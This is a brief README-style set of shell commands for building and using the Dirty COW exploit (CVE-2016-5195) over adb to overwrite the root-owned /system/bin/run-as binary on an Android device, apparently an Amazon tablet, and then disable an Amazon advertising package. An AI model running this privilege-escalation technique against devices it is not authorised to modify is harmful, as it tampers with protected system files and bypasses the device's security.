# Disable Amazon Ads (Using Exploit CVE-2016-5195)
```
# edit the Makefile to point to your NDK toolchain or use Android.mk
$ make run-as
$ make dirtycow
$ adb push run-as /data/local/tmp
$ adb push dirtycow /data/local/tmp
$ adb shell /data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as
$ adb shell /system/bin/run-as
Package com.amazon.phoenix new state: disabled
$
```
